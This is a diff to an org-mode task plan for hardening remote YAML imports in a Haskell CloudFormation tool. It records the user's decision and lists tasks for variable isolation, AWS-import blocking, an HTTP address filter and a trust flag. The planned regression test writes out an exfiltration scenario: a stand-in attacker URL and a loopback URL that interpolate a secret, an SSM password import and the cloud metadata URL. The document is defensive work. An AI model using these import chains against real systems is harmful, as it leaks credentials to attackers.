@@ -47,17 +47,71 @@ before code changes.
 :ADDED: [2026-11-16 Mon 15:54]
 :END:
 
-Allowed paths: =notes/C15/= for the options write-up; after the user's
-decision, =src/Iidy/Yaml/=, =test/=, =test-fixtures/=, =docs/= (security
-model) and =SECURITY.md=.
+Options write-up and decision: done (see the two tasks below). The scope
+below governs the implementation tasks.
 
-Gate: an options write-up compares at least: blocking AWS-backed and
-loopback/link-local imports from remote templates; isolating remote
-templates from parent variables (explicit passing only); both; and what the
-TypeScript (=~/src/iidy-js=) and Rust (=~/src/iidy=) versions do; the user
-has chosen; the chosen model is implemented with tests reproducing the
-review's exfiltration scenario and showing it blocked; docs describe the
-model; build warning-free, tests pass; committed with C15.
+Allowed paths: =src/Iidy/Yaml/=, =src/Iidy/Cli.hs=, =src/Iidy/Cli/=
+(the flag), the call sites that build an =ImportConfig= or thread
+=RemoteImports= (=app/Main.hs=, =src/Iidy/Cfn/= (=Context.hs=,
+=Runner.hs=, =RequestBuilder.hs=, =StackArgsLoader.hs=,
+=TemplateLoader.hs=, =Operations/EstimateCost.hs=,
+=Operations/LintTemplate.hs=, =Operations/TemplateApproval.hs=),
+=src/Iidy/Render.hs=, =src/Iidy/GetImport.hs=, =src/Iidy/Demo.hs=), =test/=,
+=test-fixtures/=, =docs/*.org= and =docs/requirements/= (import system and
+custom resources), =DIVERGENCES.md=, =notes/C15/=.
+
+Out of scope: blocking private address ranges (=10/8=, =172.16/12=,
+=192.168/16=); a stack-args or config-file key for trusted sources; taint
+tracking; forbidding interpolation in import locations (option (d));
+restoring Rust's bare-relative-import inheritance from remote documents
+(kept rejected, see the decision); changes to =--no-remote-imports=; the
+=!$escaped= side finding in the options report; any new dependency.
+
+Done when:
+- [ ] Every imported document, local or remote, is resolved without the
+  importing document's variables (Rust =src/yaml/engine.rs:409=); a test
+  shows a parent variable is not visible and the error names it.
+- [ ] Custom resource templates loaded from untrusted locations expand
+  with their parameters only, for both resource-type use and =!$expand=;
+  local and trusted-source templates keep the parent's variables (Rust
+  parity); tests cover all three cases at both sites.
+- [ ] Untrusted documents cannot import =ssm:=, =ssm-path:=, =cfn:= or
+  =s3:= (both =s3:= forms); local documents and documents under a trusted
+  prefix can; table-driven tests cross untrusted bases with each type.
+- [ ] HTTP imports requested by untrusted documents cannot reach
+  loopback, link-local, unspecified or AWS instance-metadata addresses
+  (IPv4, IPv6 and IPv4-mapped forms), checked on the first request and on
+  every redirect hop; tests use a mock HTTP client and resolver (no real
+  network, no socket opened) and cover a literal address, a host name
+  that resolves to a blocked address, and a public URL redirecting to
+  =169.254.169.254=.
+- [ ] =--trust-import-source PREFIX= is repeatable, validated at parse
+  time, and restores today's behaviour (AWS-backed imports, no address
+  filter, parent variables for custom templates) for documents under a
+  listed prefix; a redirect from a trusted URL to a location outside the
+  trusted prefixes is refused; tests cover parsing, prefix boundaries
+  (=https://t.example.com/= does not trust =https://t.example.com.evil/=)
+  and each restored behaviour.
+- [ ] A test reproduces the C4 review's exfiltration scenario (parent
+  =$defs= secret, remote document with =ssm:= import and loopback and
+  attacker URLs interpolating the secret) through the real dispatcher and
+  shows each step blocked; recorded failing on the branch base.
+- [ ] The trust decision lives in one place, next to =isLocalBase= in
+  =src/Iidy/Yaml/Imports/Types.hs=; the dispatcher, HTTP loader and engine
+  call it and repeat no trust logic.
+- [ ] =docs/SECURITY.org=, =docs/import-types.org=,
+  =docs/custom-resource-templates.org=, =docs/command-reference.org= and
+  the import-system and custom-resource requirements describe the model;
+  =DIVERGENCES.md= has an entry for each departure from Rust.
+- [ ] Build warning-free, full suite green, each commit names C15.
+
+Stop and record if: an existing fixture or test whose expected output came
+from Rust depends on an imported document seeing parent variables; the
+address check cannot cover the address actually connected to without
+=Network.HTTP.Client.Internal= or a new dependency (record the remaining
+gap instead of widening scope); a change is needed outside the allowed
+paths; =src/Iidy/Yaml/Resolution/Resolver.hs= (already over 900 lines)
+would grow by more than a few lines.
 
 * DONE Write up the options and compare with the TypeScript and Rust versions
 :PROPERTIES:
@@ -78,10 +132,15 @@ It recommends isolation plus blocking AWS-backed and loopback/link-local
 imports from untrusted documents, with an opt-in trust flag, and lists the
 questions for Tavis.
 
-* TODO Discuss with the user and record the decision
+* DONE Discuss with the user and record the decision
 :PROPERTIES:
 :ID: org:01a1e692-13fd-7254-9ca2-0d8db4d6be1a
 :ADDED: [2026-11-16 Mon 15:54]
+:END:
+:LOGBOOK:
+- State "DONE"       from "TODO" [2026-11-16 Mon 17:52] \\
+  Agent: opus-5.5-medium
+  Session-ID: 113e42ab-bf76-4434-899c-00879502d398/agent:a52135d0817e2fb40
 :END:
 
 Also decide (found by C14, 2026-11-16): a bare relative import from a
@@ -90,8 +149,249 @@ remote template inherits the parent's scheme in Rust, TypeScript and
 in =DIVERGENCES.md=). Either restore Rust's behaviour under the chosen
 model or correct that doc criterion.
 
-* TODO Implement the chosen model with tests and docs
+** Decision (Tavis, 2026-11-16)
 :PROPERTIES:
-:ID: org:01a1e692-13fd-7254-9ca2-0d8c55835f59
-:ADDED: [2026-11-16 Mon 15:54]
+:ID: org:01a1e6fe-2be7-72bd-983a-90cf40a75459
+:ADDED: [2026-11-16 Mon 17:52]
 :END:
+
+Option (c) plus (e):
+- Isolate imported documents from parent variables (all imported
+  documents, matching Rust and TypeScript).
+- Isolate custom-resource templates loaded from untrusted (non-local)
+  locations from parent variables as TypeScript does (local custom
+  templates keep them, as Rust).
+- Block AWS-backed imports (=ssm:=, =ssm-path:=, =cfn:=, =s3:=) and
+  loopback/link-local HTTP targets from untrusted documents, checking
+  every redirect.
+- Add an opt-in trust flag (=--trust-import-source PREFIX=, repeatable) so
+  named sources keep today's behaviour.
+
+This also settles question 3 of the options report: =s3:= is blocked from
+untrusted documents entirely, with no same-bucket exception (S3-hosted
+templates that import siblings need their bucket listed as a trusted
+source), and question 4's first half: loopback and link-local only, not
+private ranges.
+
+** Remaining questions
+:PROPERTIES:
+:ID: org:01a1e6fe-2be7-72bd-983a-90ce477761ea
+:ADDED: [2026-11-16 Mon 17:52]
+:END:
+
+Each answer is the supervisor's call, from the recommendation Tavis
+accepted, unless marked otherwise.
+
+- Question 4, which requests the address filter covers: only HTTP imports
+  requested by untrusted documents (the options report's recommendation).
+  Local and trusted-source documents may still fetch from loopback, for
+  example a local development server. "Link-local" includes the AWS
+  metadata addresses =169.254.169.254= and =fd00:ec2::254= (the second is
+  not link-local by range, so it is listed explicitly), and the check also
+  covers unspecified addresses (=0.0.0.0/8=, =::=) and IPv4-mapped IPv6
+  forms of every blocked IPv4 range.
+- Question 5, where trusted sources come from: the command-line flag only.
+  No stack-args or config key; a file that could itself be imported must
+  not widen trust (supervisor's call, fail-closed; no recorded
+  recommendation).
+- Question 5, prefix matching (supervisor's call, fail-closed; no recorded
+  recommendation): a prefix must be a non-local location with a known
+  remote scheme (=s3://=, =s3:=, =http://=, =https://=, =ssm:=,
+  =ssm-path:=, =cfn:=), must end in =/=, and for =s3://= and =http(s)://=
+  must name a bucket or host. Matching is a literal, case-sensitive text
+  prefix of the document's location, so =s3:b/= and =s3://b/= are listed
+  separately. Invalid prefixes are a command-line error.
+- Question 6, documents loaded through =ssm:=, =ssm-path:= or =cfn:=:
+  untrusted, as C14 already treats their bases (from the recommendation in
+  =notes/C23/report--decisions-vs-originals.org= item 8, which leaves it
+  open, and C14's fail-closed rule). A user who stores templates in SSM
+  can list =ssm:/their/prefix/= as a trusted source.
+- Redirects from a trusted source (supervisor's call, fail-closed; no
+  recorded recommendation): a document's trust is decided from the
+  location it was requested at, so a request to a URL under a trusted
+  prefix may only redirect to locations that are also trusted; any other
+  redirect is an error.
+- The root template: a template given on the command line or as
+  =Template:= in stack-args with an =s3:= or =http(s):= location is
+  untrusted like any other document (supervisor's call, fail-closed; it
+  follows from C14's base classification). Users list its prefix to keep
+  its =ssm:= and =cfn:= imports working.
+- Bare relative import from a remote document (found by C14): keep
+  rejecting it and correct the documents that describe inheritance
+  (=docs/SECURITY.org= "Relative Import Behavior", =docs/import-types.org=
+  around lines 151 and 275, =docs/requirements/03-import-system.org=
+  around line 440); the existing =DIVERGENCES.md= paragraph stays
+  (supervisor's call, fail-closed; no recorded recommendation). Restoring
+  Rust's behaviour would not give a remote document any capability it
+  lacks, since it can write the absolute URL, so Tavis may prefer parity;
+  that would be a separate card.
+
+* TODO Isolate imported documents from parent variables
+:PROPERTIES:
+:ID: org:01a1e6fe-2be7-72bd-983a-90cdfb79ef65
+:ADDED: [2026-11-16 Mon 17:52]
+:END:
+Rust parity, no =DIVERGENCES.md= entry. In =src/Iidy/Yaml/Engine.hs=, drop
+the =env= argument of =processImportedDoc= (=:214-223=, called at =:199=)
+and start =loadImportsAndDefs= at =:233= from =Map.empty=, as Rust's
+=process_imported_document= does (=~/src/iidy/src/yaml/engine.rs:409=).
+Fix the docstring at =:211-213=. Import-location interpolation (=:170=)
+then sees only the document's own variables. Tests in
+=test/Test/EngineTest.hs= ("Recursive import preprocessing", around
+=:128-260=): a local child referencing a parent =$defs= value fails with a
+variable error naming it; a child interpolating a parent variable into its
+own import location fails; a child using its own =$defs= still works.
+Record the first test failing on the branch base.
+
+* TODO Add the trust policy next to isLocalBase and thread it to the dispatcher
+:PROPERTIES:
+:ID: org:01a1e6fe-2be7-72bd-983a-90cc07412e3a
+:ADDED: [2026-11-16 Mon 17:52]
+:END:
+No behaviour change. In =src/Iidy/Yaml/Imports/Types.hs=, beside
+=isLocalBase= (=:131-134=): =TrustedSources= (validated prefixes) with
+=noTrustedSources=, =parseTrustedSource= (the prefix rules in the decision),
+and =isTrustedBase :: TrustedSources -> Text -> Bool= (=isLocalBase= or a
+listed prefix). Keep =parseImportType= and the C14 local-only gate
+unchanged: a trusted source never gains =file:=, =env:= or =git:=. Replace
+=RemoteImports= threading with an =ImportPolicy= record
+(=ipRemoteImports=, =ipTrustedSources=) built by one
+=importPolicyFromOpts= function, removing the copies of
+=if goRemoteImports ... then AllowRemoteImports else BlockRemoteImports= at
+=app/Main.hs:120=, =:252=, =:262=, =src/Iidy/Cfn/Runner.hs:54=,
+=src/Iidy/GetImport.hs:66= and =src/Iidy/Render.hs:60=. =ImportConfig=
+(=src/Iidy/Yaml/Imports/Loaders/Dispatch.hs:35-38=) carries the policy;
+=cfnRemoteImports= (=src/Iidy/Cfn/Context.hs:56=) becomes the policy.
+Table tests for =parseTrustedSource= and =isTrustedBase= in
+=test/Test/ImportTrustTest.hs=, including the prefix boundary case.
+
+* TODO Block AWS-backed imports from untrusted documents
+:PROPERTIES:
+:ID: org:01a1e6fe-2be7-72bd-983a-90cbb0dbebbc
+:ADDED: [2026-11-16 Mon 17:52]
+:END:
+New divergence. In =Types.hs=: =isAwsBacked= (=ImportCfn=, =ImportSsm=,
+=ImportSsmPath=, =ImportS3=) and one gate, for example
+=checkImport :: TrustedSources -> Text -> Text -> Either ImportError
+ImportType=, composing =parseImportType= with the AWS-backed check; the
+error names the base and suggests =--trust-import-source=.
+=mkFullDispatcher= (=Dispatch.hs:52-56=) calls it in place of
+=parseImportType=, so the gate runs before =withAwsEnv= and a render
+without credentials reports the trust error. Update the comment at
+=Dispatch.hs:71-73=. Tests: extend =ImportTrustTest= (the
+=untrustedAllowedMatrix= now expects these four types rejected; that is
+the decided change, not a weakened test), a local base and a trusted
+prefix still allowed, and the engine-level =nestedMatrix= pattern for a
+remote document importing =ssm:=.
+
+* TODO Filter HTTP targets requested by untrusted documents
+:PROPERTIES:
+:ID: org:01a1e6fe-2be7-72bd-983a-90ca9d0e6f5e
+:ADDED: [2026-11-16 Mon 17:52]
+:END:
+New divergence. Split the address logic into a new module beside
+=src/Iidy/Yaml/Imports/Loaders/Http.hs= (152 lines): a pure
+=isBlockedAddress= over resolved socket addresses (the ranges in the
+decision) and an injectable HTTP client record (resolver plus one-hop
+fetch) with a real implementation and room for a mock. In =Http.hs=,
+=fetchHttpStreaming= (=:104-114=) sets =redirectCount 0= and follows
+redirects by hand up to the current limit, using http-client's
+=getRedirectedRequest= for relative =Location= values; before each hop it
+resolves the host, refuses if any address is blocked, and pins the
+connection to the checked address (=hostAddress= on the request) so a
+second DNS answer cannot differ. The dispatcher (=Dispatch.hs:70=) derives
+the request's guard from =Types.hs= (filter when the requester is not
+=isTrustedBase=; restrict redirects to trusted locations when the
+requested URL is under a trusted prefix) and passes it with the client
+from =ImportConfig=. Tests with the mock client only: literal
+=127.0.0.1=, =[::1]=, =[::ffff:169.254.169.254]=, =0.0.0.0=; a host name
+resolving to =169.254.169.254=; a public URL redirecting there; a local
+requester allowed to reach loopback; a trusted URL redirecting outside its
+prefix refused; the mock records that no blocked host was fetched.
+
+* TODO Isolate custom templates loaded from untrusted locations
+:PROPERTIES:
+:ID: org:01a1e6fe-2be7-72bd-983a-90c9f90ef3ee
+:ADDED: [2026-11-16 Mon 17:52]
+:END:
+New divergence from Rust (matches TypeScript). Add a field to
+=TemplateInfo= (=src/Iidy/Yaml/CustomResources/Params.hs:40-44=) saying
+whether the template inherits parent variables, set in
+=src/Iidy/Yaml/Engine.hs:186= from =isTrustedBase= on the template's
+location. The engine needs the trusted sources: add an entry point that
+takes them (keeping =preprocessYaml= for callers with no trusted sources)
+and use it from =Render.hs=, =Cfn/TemplateLoader.hs=,
+=Cfn/StackArgsLoader.hs= and =Demo.hs=. Put one helper choosing the base
+variables in =src/Iidy/Yaml/Resolution/Context.hs= (next to
+=withBindings=) and use it at the two union sites in
+=src/Iidy/Yaml/Resolution/Resolver.hs=: =buildReparse= (=:319-330=, built
+at =:283= where the =TemplateInfo= is in scope) and =resolveExpand=
+(=:892=). Tests (=ResolverTest= =mkTemplateInfo= at =:1275=, and
+=EngineTest=): local, untrusted and trusted templates, each through a
+resource type and through =!$expand=.
+
+* TODO Add the --trust-import-source flag
+:PROPERTIES:
+:ID: org:01a1e6fe-2be7-72bd-983a-90c80ff65b52
+:ADDED: [2026-11-16 Mon 17:52]
+:END:
+New flag, iidy-hs only. =GlobalOpts= (=src/Iidy/Cli.hs:66-74=) gains the
+list; =src/Iidy/Cli/Parser.hs= (next to =--no-remote-imports=,
+=:137-141=) parses a repeatable option with =parseTrustedSource= as its
+reader; =src/Iidy/Cli/Help.hs= (next to =:271=) documents it;
+=importPolicyFromOpts= fills =ipTrustedSources=. Update
+=test/Test/Shared.hs:547= and the parser tests. Tests: repeated flags
+accumulate, an invalid prefix is a parse error, and a render through the
+real dispatcher (stub remote loader, mock HTTP client) behaves as today
+for a listed prefix.
+
+* TODO Regression test for the C4 exfiltration scenario
+:PROPERTIES:
+:ID: org:01a1e6fe-2be7-72bd-983a-90c787c0534a
+:ADDED: [2026-11-16 Mon 17:52]
+:END:
+A table-driven engine test in =test/Test/ImportTrustTest.hs= reproducing
+[[id:org:01a1e68e-1585-707c-91d5-94ce6b11308a][High: remote templates can read secrets and exfiltrate them]]:
+a local parent with =$defs: {secret: ...}= imports
+=https://evil.example/t.yaml= (stub loader); the remote document imports
+=ssm:/prod/db/password=, =http://127.0.0.1:9/{{secret}}=,
+=http://169.254.169.254/latest/meta-data/= and
+=https://evil.example/{{s}}=. Every other location goes through the real
+dispatcher with a recording mock HTTP client. Assert each step is blocked
+and that the mock saw no request carrying the secret. Run it on the
+branch base (or with the earlier commits reverted locally) and record the
+failure here.
+
+* TODO Document the model and record the divergences
+:PROPERTIES:
+:ID: org:01a1e6fe-2be7-72bd-983a-90c66884bb15
+:ADDED: [2026-11-16 Mon 17:52]
+:END:
+=docs/SECURITY.org=: rewrite "Overview", "Remote-Allowed Import Types",
+"Relative Import Behavior" (inheritance is not supported; see the
+decision), "What This Allows" (remove AWS integration from untrusted
+documents), and add sections on variable isolation, custom-template
+isolation, the HTTP address filter and redirects, trusted sources, and
+remaining risks (private ranges, parameters a user passes to a remote
+template). =docs/import-types.org= (around =:151=, =:275-277=, and the
+=ssm:=, =cfn:= and =s3:= sections), =docs/custom-resource-templates.org=
+(the S3 bucket pattern at =:196= and parent-variable access),
+=docs/command-reference.org= (the flag),
+=docs/requirements/03-import-system.org= (around =:440=) and
+=docs/requirements/04-custom-resources.org=. =DIVERGENCES.md=: one entry
+each for the AWS-backed import block, the HTTP address filter and manual
+redirects, custom-template isolation, and =--trust-import-source=; leave
+the C14 relative-import paragraph as is.
+
+User-visible changes to state in the docs:
+- An imported document can no longer read the importing template's
+  variables; pass values as =$params= (already true in Rust and
+  TypeScript).
+- A remote custom template no longer sees the parent's variables.
+- A remote template, including a root template given as an =s3:= or
+  =http(s):= location, can no longer import =ssm:=, =ssm-path:=, =cfn:= or
+  =s3:= unless its prefix is trusted.
+- HTTP imports from remote templates cannot reach loopback, link-local or
+  metadata addresses, including through redirects.
+- =--trust-import-source PREFIX= restores the previous behaviour for
+  listed sources.
